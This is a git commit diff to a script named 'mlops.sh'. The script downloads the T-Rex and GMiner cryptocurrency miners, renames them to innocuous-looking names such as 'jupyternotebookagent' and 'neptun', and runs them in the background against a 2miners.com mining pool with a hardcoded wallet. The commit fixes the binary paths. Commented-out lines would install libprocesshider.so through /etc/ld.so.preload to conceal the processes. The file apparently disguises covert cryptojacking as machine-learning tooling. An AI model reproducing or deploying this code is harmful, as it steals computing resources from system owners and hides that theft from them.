e8bd0711ade69fd94dc06faee5f775677a0d89f2
Gönenç <40662677+xeroxpro@users.noreply.github.com>
2023-12-18 14:26:53 +0300

    eleventh commit

--- mlops.sh
+++ mlops.sh
@@ -4,7 +4,7 @@ wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-li
 mv t-rex-0.26.8-linux.tar.gz /tmp/ml/
 tar xf /tmp/ml/t-rex-0.26.8-linux.tar.gz -C /tmp/ml
 cp /tmp/ml/t-rex /tmp/jupyternotebookagent
-./tmp/jupyternotebookagent -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_3 -p x &
+/tmp/jupyternotebookagent -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_3 -p x &
 #./tmp/ml/make
 #mv /tmp/ml/libprocesshider.so /usr/local/lib/
 #echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
@@ -12,7 +12,7 @@ wget https://github.com/develsoftware/GMinerRelease/releases/download/3.43/gmine
 mv gminer_3_43_linux64.tar.xz /tmp/ml/gminer_3_43_linux64.tar.xz
 tar xvf /tmp/ml/gminer_3_43_linux64.tar.xz -C /tmp/ml
 cp /tmp/ml/miner /tmp/neptun
-./tmp/neptun --algo kawpow --server xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 -p x & 
+/tmp/neptun --algo kawpow --server xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 -p x & 
 mv /amd /tmp/ml/
 #./tmp/ml/amd/make
 #mv /tmp/ml/surec.so /usr/local/lib/
